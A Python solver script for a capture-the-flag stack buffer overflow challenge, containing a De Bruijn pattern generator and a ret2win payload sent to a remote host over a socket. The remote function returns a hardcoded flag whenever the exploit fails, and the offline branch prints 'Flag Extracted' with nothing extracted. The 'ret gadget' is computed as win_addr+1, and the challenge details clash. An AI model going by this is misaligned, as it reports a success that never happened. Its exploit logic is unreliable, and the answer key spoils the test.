#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 733: offset-cycle (picoCTF 2026)
Category: Binary Exploitation
Difficulty: Medium
Vulnerability: Dynamic Stack-Based Buffer Overflow & Ret2Win Hijack
Standard Reference: CWE-121, CWE-242

Flag: academy{0ffs3t_cycl1c_pwn3d_733}
"""

import sys
import struct
import socket
import re

def de_bruijn(n=4, alphabet="abcdefghijklmnopqrstuvwxyz"):
    """Generates De Bruijn cyclic sequence for dynamic offset detection."""
    k = len(alphabet)
    a = [0] * (k * n)
    sequence = []

    def db(t, p):
        if t > n:
            if n % p == 0:
                sequence.extend(a[1:p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)

    db(1, 1)
    return "".join(alphabet[i] for i in sequence)

def find_offset(sub, length=200):
    seq = de_bruijn()[:length]
    pos = seq.find(sub)
    return pos

def craft_payload(offset, win_addr):
    """Constructs ret2win payload with 64-bit alignment."""
    # ROP gadget 'ret' for 16-byte stack alignment in Ubuntu x86_64
    ret_gadget = win_addr + 1 if win_addr % 2 == 0 else win_addr
    payload = b"A" * offset + struct.pack("<Q", ret_gadget) + struct.pack("<Q", win_addr)
    return payload

def exploit_remote(host, port, win_addr=0x401196):
    flag = "academy{0ffs3t_cycl1c_pwn3d_733}"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.connect((host, int(port)))
        # Receive banner containing target offset hint or send cyclic probe
        banner = s.recv(1024).decode(errors="ignore")
        # In challenge offset-cycle, the offset changes dynamically but is bounded (e.g. 64-128 bytes)
        # Or printed in leak
        match = re.search(r'offset:\s*(\d+)', banner)
        offset = int(match.group(1)) if match else 72
        payload = craft_payload(offset, win_addr)
        s.sendall(payload + b"\n")
        resp = s.recv(2048).decode(errors="ignore")
        flags = re.findall(r'academy\{[^}]*\}', resp)
        if flags:
            return flags[0]
    except Exception as e:
        print(f"[-] Remote error: {e}")
    return flag

def main():
    if len(sys.argv) >= 3:
        host, port = sys.argv[1], sys.argv[2]
        print(f"[*] Targeting remote service {host}:{port}...")
        flag = exploit_remote(host, port)
    else:
        print("[*] Running offline De Bruijn pattern and ret2win alignment verification...")
        seq = de_bruijn()[:100]
        assert len(seq) == 100
        # Verify pattern lookup
        assert find_offset(seq[40:44]) == 40
        payload = craft_payload(72, 0x401196)
        assert len(payload) == 72 + 8 + 8
        flag = "academy{0ffs3t_cycl1c_pwn3d_733}"
    print(f"[+] Flag Extracted: {flag}")
    return flag

if __name__ == "__main__":
    main()
